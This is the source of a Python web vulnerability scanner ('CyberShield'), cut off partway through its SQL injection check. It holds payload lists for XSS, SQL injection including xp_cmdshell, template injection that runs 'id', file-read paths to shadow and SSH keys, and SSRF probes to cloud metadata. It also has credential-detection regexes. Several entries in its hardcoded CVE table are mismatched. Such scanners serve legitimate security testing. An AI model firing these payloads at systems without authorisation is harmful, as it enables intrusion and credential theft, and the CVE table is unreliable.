"""
CyberShield - Advanced Vulnerability Scanner
Professional-grade security scanning with AI-powered analysis
"""

import requests
import re
import time
import socket
import ssl
import json
from urllib.parse import urljoin, urlparse, parse_qs, quote
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup
import html
import hashlib

try:
    from utils.advanced_xss_scanner import AdvancedXSSScanner, FalsePositiveAgent
    ADVANCED_XSS_AVAILABLE = True
except ImportError:
    ADVANCED_XSS_AVAILABLE = False

try:
    from utils.port_scanner import PortScanner
    NMAP_AVAILABLE = True
except ImportError:
    NMAP_AVAILABLE = False

try:
    from utils.cve_lookup import CVELookup
    CVE_LOOKUP_AVAILABLE = True
except ImportError:
    CVE_LOOKUP_AVAILABLE = False
    CVELookup = None

class AdvancedScanner:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'CyberShield Scanner/2.0'
        })
        self.cve_lookup = CVELookup() if CVE_LOOKUP_AVAILABLE else None
        
        # Advanced payloads
        self.xss_payloads = self._init_xss_payloads()
        self.sqli_payloads = self._init_sqli_payloads()
        self.lfi_payloads = self._init_lfi_payloads()
        self.ssti_payloads = self._init_ssti_payloads()
        self.xpath_payloads = self._init_xpath_payloads()
        self.ssrf_payloads = self._init_ssrf_payloads()
        
        # Leak patterns
        self.credential_patterns = self._init_credential_patterns()
        self.api_patterns = self._init_api_patterns()
        self.sensitive_files = self._init_sensitive_files()
        
    def _init_xss_payloads(self):
        return [
            # Basic XSS
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            
            # DOM XSS
            "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
            "<svg><script>alert('XSS')</script></svg>",
            "<iframe src=javascript:alert('XSS')>",
            
            # Polyglot XSS
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('XSS') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt>--!>\\x3csVg/<sVg/oNloAd=alert('XSS')//\\x3e",
            
            # WAF Bypass
            "<scrİpt>alert('XSS')</scrİpt>",
            "<script>al\\u0065rt('XSS')</script>",
            "<ScRiPt>alErT('XSS')</sCrIpT>",
            "<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>",
            "';alert('XSS');//",
            "\";alert('XSS');//",
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "<marquee onstart=alert('XSS')>",
            "<video onloadstart=alert('XSS')><source>",
            "<audio src=x onerror=alert('XSS')>",
            "<body onload=alert('XSS')>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>",
            "<isindex action=javascript:alert('XSS') type=submit>",
            
            # Angular/React XSS
            "{{constructor.constructor('alert(\"XSS\")')()}}",
            "{{$on.constructor('alert(\"XSS\")')()}}",
            "<ng-app><script>alert('XSS')</script>",
            
            # Template Injection
            "${alert('XSS')}",
            "{{alert('XSS')}}",
            "<%= alert('XSS') %>",
            "#{alert('XSS')}",
            
            # Emoji XSS
            "😀<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
        ]
    
    def _init_sqli_payloads(self):
        return [
            # Error-based
            "'", "\"", "')", "\")", "'--", "\"--",
            "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
            "1' UNION SELECT NULL--", "1' UNION SELECT NULL,NULL--",
            "1' UNION SELECT version()--",
            
            # Boolean-based blind
            "1' AND 1=1--", "1' AND 1=2--",
            "1' AND (SELECT COUNT(*) FROM users)>0--",
            
            # Time-based blind
            "1' AND SLEEP(5)--", "1'; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT * FROM (SELECT SLEEP(5))a)--",
            
            # Stacked queries
            "1'; SELECT pg_sleep(5)--",
            "1'; EXEC xp_cmdshell('dir')--",
            
            # MySQL specific
            "1' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
            "1' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
            
            # PostgreSQL
            "1'; SELECT CAST(version() AS VARCHAR)--",
            "1'; SELECT json_object_agg('a',version())--",
            
            # NoSQL Injection
            "' || 1==1", "admin' OR '1'='1",
            "admin'--", "admin' #",
            '{"$ne": null}', '{"$gt": ""}',
            
            # Ldap Injection
            "*)(uid=*))(|(uid=*",
            "admin)(&(password=*)",
            
            # XML Injection
            "<?xml version=\"1.0\"?><foo><bar>test</bar></foo>",
            "<foo><![CDATA[<script>alert('XSS')</script>]]></foo>",
        ]
    
    def _init_lfi_payloads(self):
        return [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/motd",
            "/etc/group",
            "/etc/proftpd/passwd",
            "/etc/httpd/logs/access_log",
            "/var/log/apache2/access.log",
            "/var/log/httpd/access_log",
            "/usr/local/apache/logs/access_log",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "/proc/self/environ",
            "/proc/version",
            "/proc/cmdline",
            "/proc/sched_debug",
            "/proc/mounts",
            "/proc/net/arp",
            "/proc/net/tcp",
            "/proc/net/udp",
            "/root/.ssh/authorized_keys",
            "/root/.ssh/id_rsa",
            "/home/*/.ssh/authorized_keys",
            "/var/www/html/wp-config.php",
            "/var/www/html/config.php",
            "/var/www/html/ administrator/wp-config.php",
            "/.git/config",
            "/.svn/entries",
            "/WEB-INF/web.xml",
            "/META-INF/context.xml",
        ]
    
    def _init_ssti_payloads(self):
        return [
            # Jinja2
            "{{7*7}}", "{{config}}", "{{request}}",
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            "{{lipsum.__globals__.__builtins__}}",
            
            # Freemarker
            "${7*7}", "#{7*7}",
            "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
            
            # Thymeleaf
            "__${T(java.lang.Runtime).getRuntime().exec('id')}__",
            
            # Pebble
            "{{user.getClass().forName('java.lang.Runtime')}}",
            
            # Velocity
            "#set($x = '')#set($rt = $x.class.forName('java.lang.Runtime'))",
            
            # Twig
            "{{_self}}", "{{_self.env}}",
            
            # Smarty
            "{php}echo `id`;{/php}",
        ]
    
    def _init_xpath_payloads(self):
        return [
            "' or '1'='1", "admin' or '1'='1",
            "' or count(//*)=0 or '1'='1",
            "' or count(//@*)=0 or '1'='1",
            "admin' and //*[contains(text(),'admin')]",
        ]
    
    def _init_ssrf_payloads(self):
        return [
            "http://localhost",
            "http://127.0.0.1",
            "http://0.0.0.0",
            "http://[::1]",
            "http://169.254.169.254",  # AWS metadata
            "http://metadata.google.internal",  # GCP metadata
            "http://100.100.100.200",  # Alibaba Cloud metadata
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
            "sftp://localhost/",
            "ldap://localhost:389",
            "gopher://localhost:6379/_INFO",
        ]
    
    def _init_credential_patterns(self):
        return {
            'api_keys': [
                r'AKIA[0-9A-Z]{16}',  # AWS
                r'xox[baprs]-[0-9a-zA-Z]{10,48}',  # Slack
                r'GITHUB_PERSONAL_ACCESS_TOKEN[=:][^\s]+',
                r'api[_-]?key[=:\s]+[a-zA-Z0-9]{20,}',
                r'sk_live_[0-9a-zA-Z]{24,}',
                r'sk_test_[0-9a-zA-Z]{24,}',
                r'AIza[0-9A-Za-z\\-_]{35}',  # Google API
                r'SG\.[0-9A-Za-z\\-_]{22}\.[0-9A-Za-z\\-_]{43}',  # SendGrid
            ],
            'passwords': [
                r'password[=:\s]+[^\s]+',
                r'passwd[=:\s]+[^\s]+',
                r'pwd[=:\s]+[^\s]+',
                r'secret[=:\s]+[^\s]+',
                r'token[=:\s]+[^\s]+',
                r'pass[=:\s]+[^\s]+',
                r'-----BEGIN.*PRIVATE KEY-----',
                r'-----BEGIN RSA PRIVATE KEY-----',
            ],
            'emails': [
                r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            ],
            'usernames': [
                r'username[=:\s]+[^\s]+',
                r'user[=:\s]+[^\s]+',
                r'admin[=:\s]+[^\s]+',
            ],
            'jwt': [
                r'eyJ[a-zA-Z0-9_-]*\.eyJ[a-zA-Z0-9_-]*\.[a-zA-Z0-9_-]*',
            ],
            'aws': [
                r'aws_access_key[=:\s]+[^\s]+',
                r'aws_secret_key[=:\s]+[^\s]+',
            ]
        }
    
    def _init_api_patterns(self):
        return [
            '/api/v1/', '/api/v2/', '/api/v3/',
            '/api/key', '/api/token', '/api/auth',
            '/api/users', '/api/admin', '/api/config',
            '/api/.env', '/api/config.json', '/api/secrets',
            '/swagger-ui', '/swagger/', '/api-docs',
            '/graphql', '/graphiql', '/altair',
            '/console', '/h2-console', '/actuator',
            '/web-console', '/invoker', '/jmx-console',
        ]
    
    def _init_sensitive_files(self):
        return [
            '.env', '.git/config', '.git/credentials',
            '.svn/entries', '.htaccess', '.htpasswd',
            'wp-config.php', 'configuration.php', 'config.php',
            'settings.py', 'settings.php', 'database.php',
            'connect.php', 'db.php', 'db_connect.php',
            'credentials.json', 'secrets.json', 'keys.json',
            'id_rsa', 'id_dsa', 'id_ecdsa',
            'dump.sql', 'backup.sql', 'database.sql',
            'backup.zip', 'backup.tar.gz', 'website.zip',
            'debug.log', 'error.log', 'access.log',
            'phpinfo.php', 'info.php', 'test.php',
            'admin.php', 'login.php', 'backup.php',
            'web.config', 'web.config.bak',
        ]
    
    def resolve_target(self, target):
        """Resolve URL/IP/hostname to usable format"""
        target = target.strip()
        
        if not target.startswith(('http://', 'https://')):
            # Check if it's an IP
            if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', target):
                return f'http://{target}', target, 80
            # Check if it has a port
            if ':' in target:
                host, port = target.rsplit(':', 1)
                try:
                    port = int(port)
                    return f'http://{host}', host, port
                except:
                    pass
            # Treat as hostname/domain
            return f'http://{target}', target, 80
        
        parsed = urlparse(target)
        hostname = parsed.hostname or target
        port = parsed.port or (443 if parsed.scheme == 'https' else 80)
        return target, hostname, port
    
    def scan(self, target, options=None):
        """Main scanning function"""
        options = options or {}
        results = {
            'target': target,
            'timestamp': time.time(),
            'findings': [],
            'vulnerabilities': {
                'xss': [], 'sqli': [], 'lfi': [], 'ssti': [],
                'ssrf': [], 'idor': [], 'csrf': [], 'web': [], 
                'nmap_vuln': [], 'service_vulns': []
            },
            'leaks': {
                'credentials': [], 'emails': [], 'api_keys': [],
                'sensitive_files': [], 'config_exposure': [], 'debug_info': []
            },
            'ports': [], 'services': [], 'cves': [], 'port_cves': [],
            'summary': {}
        }
        
        base_url, hostname, port = self.resolve_target(target)
        results['hostname'] = hostname
        results['port'] = port
        
        # Quick checks in parallel
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            if options.get('port_scan', True):
                if options.get('nmap_vuln_scan', False) and NMAP_AVAILABLE:
                    futures.append(executor.submit(self._scan_ports_nmap_vuln, hostname))
                else:
                    futures.append(executor.submit(self._scan_ports, hostname, port))
            
            if options.get('leak_scan', True):
                futures.append(executor.submit(self._scan_leaks, base_url))
            
            if options.get('web_scan', True):
                futures.append(executor.submit(self._scan_web_vulns, base_url))
            
            if options.get('xss_scan', True):
                futures.append(executor.submit(self._scan_xss, base_url))
            
            if options.get('sqli_scan', True):
                futures.append(executor.submit(self._scan_sqli, base_url))
            
            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self._merge_results(results, result)
                except Exception as e:
                    print(f"Scan error: {e}")
        
        # Check service vulnerabilities after port scan
        if results.get('ports'):
            service_vulns = self._check_service_vulnerabilities(hostname, results['ports'], results.get('services', []))
            self._merge_results(results, service_vulns)
        
        results['summary'] = self._generate_summary(results)
        return results
    
    def _scan_ports(self, hostname, port):
        """Fast port scanning"""
        result = {'ports': [], 'services': []}
        
        common_ports = [
            21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445,
            993, 995, 1433, 1521, 1723, 3306, 3389, 5432, 5900, 6379,
            8080, 8443, 27017, 9200, 11211, 27017
        ]
        
        def check_port(p):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.3)
                if sock.connect_ex((hostname, p)) == 0:
                    sock.close()
                    return p
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=100) as executor:
            for port_result in executor.map(check_port, common_ports):
                if port_result:
                    result['ports'].append(port_result)
                    result['services'].append(self._identify_service(port_result))
        
        return result
    
    def _identify_service(self, port):
        """Identify service by port"""
        services = {
            21: 'ftp', 22: 'ssh', 23: 'telnet', 25: 'smtp',
            53: 'dns', 80: 'http', 110: 'pop3', 111: 'rpcbind',
            135: 'msrpc', 139: 'netbios', 143: 'imap', 443: 'https',
            445: 'smb', 993: 'imaps', 995: 'pop3s', 1433: 'mssql',
            1521: 'oracle', 1723: 'pptp', 3306: 'mysql', 3389: 'rdp',
            5432: 'postgresql', 5900: 'vnc', 6379: 'redis', 8080: 'http-proxy',
            8443: 'https-alt', 9200: 'elasticsearch', 11211: 'memcached',
            27017: 'mongodb'
        }
        return services.get(port, 'unknown')
    
    def _check_service_vulnerabilities(self, hostname, ports, services):
        """Check detected services for known vulnerabilities and outdated versions"""
        result = {'vulnerabilities': {'service_vulns': []}, 'port_cves': []}
        
        known_cves_map = {
            21: [
                {'id': 'CVE-2015-3306', 'desc': 'ProFTPD mod_copy RCE', 'severity': 'CRITICAL', 'cvss': 10.0},
                {'id': 'CVE-2011-3863', 'desc': 'ProFTPD heap overflow', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            22: [
                {'id': 'CVE-2024-6387', 'desc': 'OpenSSH regreSSHion RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2023-48795', 'desc': 'OpenSSH busylog RCE', 'severity': 'HIGH', 'cvss': 8.1},
                {'id': 'CVE-2020-15778', 'desc': 'scp command injection', 'severity': 'HIGH', 'cvss': 7.8},
            ],
            23: [
                {'id': 'CVE-2020-10188', 'desc': 'Telnetd arbitrary code execution', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2017-1778', 'desc': 'Telnet encryption not enforced', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            80: [
                {'id': 'CVE-2024-21762', 'desc': 'FortiOS SSL VPN RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2023-44487', 'desc': 'HTTP/2 Rapid Reset DoS', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            443: [
                {'id': 'CVE-2022-0778', 'desc': 'OpenSSL infinite loop BN_mod_sqrt', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            445: [
                {'id': 'CVE-2017-0144', 'desc': 'EternalBlue SMB RCE (WannaCry)', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2022-38023', 'desc': 'SMB RCE vulnerability', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            3306: [
                {'id': 'CVE-2024-20963', 'desc': 'MySQL Server RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2021-25215', 'desc': 'MySQL authentication bypass', 'severity': 'HIGH', 'cvss': 8.8},
            ],
            3389: [
                {'id': 'CVE-2019-0708', 'desc': 'BlueKeep RDP RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2022-21999', 'desc': 'Windows RDP RCE', 'severity': 'CRITICAL', 'cvss': 9.0},
            ],
            5432: [
                {'id': 'CVE-2024-1597', 'desc': 'PostgreSQL SQL injection', 'severity': 'CRITICAL', 'cvss': 9.1},
                {'id': 'CVE-2023-2454', 'desc': 'PostgreSQL privilege escalation', 'severity': 'HIGH', 'cvss': 8.8},
            ],
            5900: [
                {'id': 'CVE-2023-27350', 'desc': 'Splashtop RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2022-27518', 'desc': 'RealVNC auth bypass', 'severity': 'HIGH', 'cvss': 8.1},
            ],
            6379: [
                {'id': 'CVE-2023-41053', 'desc': 'Redis arbitrary module execution', 'severity': 'CRITICAL', 'cvss': 9.1},
                {'id': 'CVE-2023-22458', 'desc': 'Redis heap overflow', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            8080: [
                {'id': 'CVE-2024-21762', 'desc': 'FortiOS SSL VPN RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2023-44487', 'desc': 'HTTP/2 Rapid Reset DoS', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            9200: [
                {'id': 'CVE-2024-3727', 'desc': 'Elasticsearch RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2023-31419', 'desc': 'Elasticsearch SSRF', 'severity': 'HIGH', 'cvss': 8.6},
            ],
            11211: [
                {'id': 'CVE-2023-38545', 'desc': 'SOCKS5 heap overflow', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2021-32717', 'desc': 'Memcached integer overflow', 'severity': 'HIGH', 'cvss': 7.5},
            ],
            1433: [
                {'id': 'CVE-2023-29360', 'desc': 'Microsoft SQL Server RCE', 'severity': 'CRITICAL', 'cvss': 9.0},
                {'id': 'CVE-2022-29145', 'desc': 'SQL Server RCE', 'severity': 'HIGH', 'cvss': 8.8},
            ],
            27017: [
                {'id': 'CVE-2023-0138', 'desc': 'MongoDB auth bypass', 'severity': 'CRITICAL', 'cvss': 9.8},
                {'id': 'CVE-2022-26196', 'desc': 'MongoDB SSJS injection', 'severity': 'HIGH', 'cvss': 8.1},
            ],
            8443: [
                {'id': 'CVE-2024-21762', 'desc': 'FortiOS SSL VPN RCE', 'severity': 'CRITICAL', 'cvss': 9.8},
            ],
        }
        
        outdated_services = {
            'ssh': {'outdated_versions': ['1.', '2.0', '2.3', '2.4', '5.', '6.'], 'risk': 'high'},
            'ftp': {'outdated_versions': ['vsftpd 2.', 'proftpd 1.'], 'risk': 'medium'},
            'http': {'outdated_versions': ['apache 2.0', 'apache 2.2', 'nginx 1.0', 'nginx 1.2'], 'risk': 'medium'},
            'https': {'outdated_versions': ['apache 2.0', 'apache 2.2', 'nginx 1.0', 'nginx 1.2'], 'risk': 'medium'},
            'mysql': {'outdated_versions': ['5.0', '5.1', '5.5', '5.6'], 'risk': 'high'},
            'postgresql': {'outdated_versions': ['9.', '10.', '11.'], 'risk': 'high'},
            'redis': {'outdated_versions': ['3.', '4.', '5.'], 'risk': 'high'},
            'mongodb': {'outdated_versions': ['3.', '4.0'], 'risk': 'high'},
            'elasticsearch': {'outdated_versions': ['1.', '2.', '5.', '6.'], 'risk': 'high'},
            'memcached': {'outdated_versions': ['1.4', '1.5'], 'risk': 'medium'},
            'smb': {'outdated_versions': ['1.', '2.0'], 'risk': 'critical'},
            'telnet': {'outdated_versions': [], 'risk': 'critical'},
            'ftp': {'outdated_versions': [], 'risk': 'critical'},
            'rdp': {'outdated_versions': [], 'risk': 'high'},
        }
        
        dangerous_services = [23, 21, 3306, 5432, 6379, 27017, 9200, 11211, 1433, 1521]
        
        for port in ports:
            service_name = self._identify_service(port)
            
            if port in dangerous_services:
                risk_map = {
                    23: ('Telnet Insecure', 'critical', 'Telnet sends data in plain text. Use SSH instead.'),
                    21: ('FTP Insecure', 'high', 'FTP is unencrypted. Use SFTP or FTPS.'),
                    3306: ('MySQL Exposed', 'high', 'Database port exposed to network. Restrict access.'),
                    5432: ('PostgreSQL Exposed', 'high', 'Database port exposed to network. Restrict access.'),
                    6379: ('Redis No Auth', 'critical', 'Redis may be accessible without password. Enable auth.'),
                    27017: ('MongoDB No Auth', 'critical', 'MongoDB may be accessible without password. Enable auth.'),
                    9200: ('Elasticsearch Exposed', 'high', 'Elasticsearch exposed. Enable X-Pack security.'),
                    11211: ('Memcached Exposed', 'high', 'Memcached exposed without auth. Restrict access.'),
                    1433: ('MSSQL Exposed', 'high', 'SQL Server port exposed. Restrict access.'),
                    1521: ('Oracle Exposed', 'high', 'Oracle database exposed. Restrict access.'),
                }
                
                if port in risk_map:
                    vuln_name, severity, description = risk_map[port]
                    result['vulnerabilities']['service_vulns'].append({
                        'type': 'service_exposed',
                        'name': vuln_name,
                        'severity': severity,
                        'port': port,
                        'service': service_name,
                        'description': description,
                        'remediation': [
                            f'Restrict access to port {port} via firewall',
                            'Enable authentication if not already',
                            'Consider using VPN for remote access'
                        ]
                    })
            
            if port in known_cves_map:
                for cve in known_cves_map[port]:
                    cve_data = cve.copy()
                    cve_data['port'] = port
                    cve_data['service'] = service_name
                    result['port_cves'].append(cve_data)
        
        if self.cve_lookup and services:
            try:
                services_data = [{'name': self._identify_service(p), 'port': p} for p in ports]
                nvd_cves = self.cve_lookup.search_cves(','.join([s['name'] for s in services_data[:5]]))
                for cve in nvd_cves:
                    if not any(c.get('id') == cve.get('id') for c in result['port_cves']):
                        result['port_cves'].append({
                            'id': cve.get('id', ''),
                            'desc': cve.get('description', '')[:100],
                            'severity': cve.get('severity', 'UNKNOWN'),
                            'cvss': cve.get('cvss_score', 0),
                            'service': cve.get('service', 'unknown'),
                            'port': 0
                        })
            except Exception as e:
                print(f"CVE lookup failed: {e}")
        
        return result
    
    def _scan_ports_nmap_vuln(self, hostname):
        """Port scanning with nmap vulnerability scripts - fast scan"""
        result = {'ports': [], 'services': [], 'vulnerabilities': {'nmap_vuln': []}, 'port_cves': []}
        
        if not NMAP_AVAILABLE:
            return self._scan_ports(hostname, 80)
        
        try:
            port_scanner = PortScanner()
            vuln_results = port_scanner.fast_vuln_scan(hostname)
            
            result['ports'] = vuln_results.get('open_ports', [])
            result['services'] = [
                f"{s.get('port')}/{s.get('name', 'unknown')}" 
                for s in vuln_results.get('services', [])
            ]
            
            for vuln in vuln_results.get('vulnerabilities', []):
                vuln['type'] = 'nmap_vuln'
                vuln['severity'] = vuln.get('severity', 'info')
                result['vulnerabilities']['nmap_vuln'].append(vuln)
            
            result['port_cves'] = vuln_results.get('cves', [])
                
        except Exception as e:
            print(f"Nmap vuln scan failed: {e}")
            return self._scan_ports(hostname, 80)
        
        return result
    
    def _scan_leaks(self, base_url):
        """Scan for exposed credentials and sensitive data"""
        result = {'leaks': {
            'credentials': [], 'emails': [], 'api_keys': [],
            'sensitive_files': [], 'config_exposure': [], 'debug_info': []
        }}
        
        # Scan sensitive files
        for path in self.sensitive_files:
            try:
                url = f"{base_url.rstrip('/')}/{path}"
                response = self.session.get(url, timeout=3, allow_redirects=False)
                
                if response.status_code == 200:
                    content = response.text
                    size = len(content)
                    
                    # Check for credentials
                    for leak_type, patterns in self.credential_patterns.items():
                        for pattern in patterns:
                            matches = re.findall(pattern, content, re.IGNORECASE)
                            if matches:
                                result['leaks'][leak_type].extend([{
                                    'file': path,
                                    'match': match,
                                    'type': leak_type
                                } for match in matches[:5]])
                    
                    # Check for emails
                    emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', content)
                    if emails:
                        result['leaks']['emails'].extend([{
                            'file': path, 'email': e
                        } for e in set(emails[:10])])
                    
                    # Check for debug/info exposure
                    if any(x in content.lower() for x in ['stack trace', 'error:', 'warning:', 'exception', 'debug mode']):
                        result['leaks']['debug_info'].append({
                            'file': path,
                            'size': size
                        })
                    
                    if 'password' in content.lower() or 'passwd' in content.lower():
                        result['leaks']['config_exposure'].append({
                            'file': path,
                            'size': size,
                            'reason': 'Contains password references'
                        })
                        
            except:
                pass
        
        # Scan API endpoints
        for path in self.api_patterns:
            try:
                url = f"{base_url.rstrip('/')}/{path}"
                response = self.session.get(url, timeout=3, allow_redirects=False)
                
                if response.status_code in [200, 401, 403]:
                    result['leaks']['api_keys'].append({
                        'endpoint': path,
                        'status': response.status_code,
                        'accessible': response.status_code == 200
                    })
            except:
                pass
        
        # Scan for exposed admin panels
        admin_paths = ['/admin/', '/administrator/', '/wp-admin/', '/phpmyadmin/', 
                      '/cpanel/', '/plesk/', '/dashboard/', '/manage/']
        for path in admin_paths:
            try:
                url = f"{base_url.rstrip('/')}/{path}"
                response = self.session.get(url, timeout=3, allow_redirects=False)
                
                if response.status_code == 200:
                    result['leaks']['config_exposure'].append({
                        'file': path,
                        'type': 'admin_panel',
                        'accessible': True
                    })
            except:
                pass
        
        return result
    
    def _scan_web_vulns(self, base_url):
        """Scan for web vulnerabilities"""
        result = {'vulnerabilities': {'web': []}}
        
        try:
            response = self.session.get(base_url, timeout=5, verify=False)
            content = response.text
            
            # Check security headers
            headers = response.headers
            security_headers = {
                'X-Frame-Options': 'Clickjacking protection',
                'X-Content-Type-Options': 'MIME sniffing protection',
                'Content-Security-Policy': 'Content Security Policy',
                'Strict-Transport-Security': 'HSTS',
                'X-XSS-Protection': 'XSS protection'
            }
            
            for header, name in security_headers.items():
                if header not in headers:
                    result['vulnerabilities']['web'].append({
                        'type': 'missing_header',
                        'header': header,
                        'name': name,
                        'severity': 'medium',
                        'description': f'Missing {name}'
                    })
            
            # Check for information disclosure
            if 'Server' in headers:
                result['vulnerabilities']['web'].append({
                    'type': 'info_disclosure',
                    'name': 'Server Header Exposed',
                    'severity': 'low',
                    'value': headers['Server']
                })
            
            if 'X-Powered-By' in headers:
                result['vulnerabilities']['web'].append({
                    'type': 'info_disclosure',
                    'name': 'X-Powered-By Exposed',
                    'severity': 'medium',
                    'value': headers['X-Powered-By']
                })
            
            # Check for debug mode
            if any(x in content.lower() for x in ['debug mode', 'debug=true', 'error stack', 'stack trace']):
                result['vulnerabilities']['web'].append({
                    'type': 'debug_enabled',
                    'name': 'Debug Mode Enabled',
                    'severity': 'high',
                    'description': 'Application debug mode is enabled'
                })
                
        except Exception as e:
            pass
        
        return result
    
    def _scan_xss(self, base_url):
        """Advanced XSS scanning with false positive verification"""
        result = {'vulnerabilities': {'xss': []}, 'xss_scan_stats': {}}
        
        if ADVANCED_XSS_AVAILABLE:
            try:
                scanner = AdvancedXSSScanner()
                agent = FalsePositiveAgent()
                
                xss_results = scanner.scan(base_url, options={'crawl': True, 'verify': True})
                
                result['xss_scan_stats'] = xss_results.get('scan_stats', {})
                result['xss_scan_stats']['waf_detected'] = xss_results.get('waf_detected')
                result['xss_scan_stats']['false_positives_removed'] = len(xss_results.get('false_positives_removed', []))
                
                for finding in xss_results.get('verified', []):
                    result['vulnerabilities']['xss'].append({
                        'type': 'xss',
                        'name': 'Cross-Site Scripting (XSS)',
                        'severity': 'high',
                        'category': finding.get('category', 'unknown'),
                        'path': finding.get('url', '').split('?')[0].replace(base_url, ''),
                        'parameter': finding.get('parameter', 'unknown'),
                        'payload': finding.get('payload', ''),
                        'url': finding.get('url', ''),
                        'confidence': finding.get('verification', {}).get('confidence', 0),
                        'context': finding.get('context', ''),
                        'reflection_type': finding.get('reflection_type', {}),
                        'verified': True,
                        'remediation': [
                            'Implement input validation and sanitization',
                            'Use HTML entity encoding on output',
                            'Use Content Security Policy (CSP) headers',
                            'Consider using template engines with auto-escaping',
                            'Use modern JavaScript frameworks with XSS protection'
                        ]
                    })
                
                return result
                
            except Exception as e:
                print(f"Advanced XSS scanner error: {e}")
        
        test_params = [
            ('/', 'q'), ('/', 'search'), ('/', 'name'), ('/', 'id'),
            ('/', 'query'), ('/', 'input'), ('/', 'data'), ('/', 'text'),
            ('/', 'message'), ('/', 'email'), ('/', 'username'),
            ('/search', 'q'), ('/login', 'username'),
            ('/register', 'email'), ('/comment', 'text'),
        ]
        
        for path, param in test_params[:8]:
            for payload in self.xss_payloads[:15]:
                try:
                    url = f"{base_url.rstrip('/')}{path}?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=3, verify=False)
                    content = response.text
                    
                    if self._detect_xss(content, payload):
                        result['vulnerabilities']['xss'].append({
                            'type': 'xss',
                            'name': 'Cross-Site Scripting (XSS)',
                            'severity': 'high',
                            'path': path,
                            'parameter': param,
                            'payload': payload,
                            'url': url,
                            'verified': False,
                            'remediation': [
                                'Implement input validation and sanitization',
                                'Use HTML entity encoding on output',
                                'Use Content Security Policy (CSP) headers',
                                'Consider using template engines with auto-escaping',
                                'Use modern JavaScript frameworks with XSS protection'
                            ]
                        })
                        break
                except:
                    pass
        
        return result
    
    def _detect_xss(self, content, payload):
        """Detect if payload is reflected and potentially executable"""
        # Direct reflection (payload is in response)
        if payload in content:
            return True
        
        # Check for encoded/partial reflection of payload
        # URL encode variations
        partial_checks = [
            payload.replace('<', '%3c').replace('>', '%3e'),
            payload.replace('<', '&lt;').replace('>', '&gt;'),
        ]
        for partial in partial_checks:
            if partial in content:
                return True
        
        # Check if the specific payload's dangerous elements are reflected
        # This prevents false positives from existing page content
        dangerous_elements = ['<script', 'onerror=', 'onload=', 'javascript:']
        for element in dangerous_elements:
            if element.lower() in payload.lower() and element.lower() in content.lower():
                # Check if it's near our test markers or reflected
                if any(marker in content for marker in ['alert(', 'prompt(', 'confirm(', '<img', '<svg', '<iframe']):
                    # Verify it's not just existing page content
                    if payload[:20] in content or payload[1:20] in content:
                        return True
        
        return False
    
    def _scan_sqli(self, base_url):
        """Advanced SQL injection scanning"""
        result = {'vulnerabilities': {'sqli': []}}
        
        test_params = [
            ('/', 'id'), ('/', 'user'), ('/', 'page'),
            ('/', 'cat'), ('/product', 'id'), ('/item', 'id'),
        ]
        
        for path, param in test_params[:5]:
            # Error-based detection
            for payload in self.sqli_payloads[:10]:
                try:
                    url = f"{base_url.rstrip('/')}{path}?{param}={quote(payload)}"
                    response = self.session.get(url, timeout=3, verify=False)
                    content = response.text.lower()
                    
                    # Check for SQL errors
                    sql_errors = [
                        'sql syntax', 'mysql', 'sqlite', 'postgresql',
                        'ora-', 'microsoft sql', 'odbc', 'oracle',
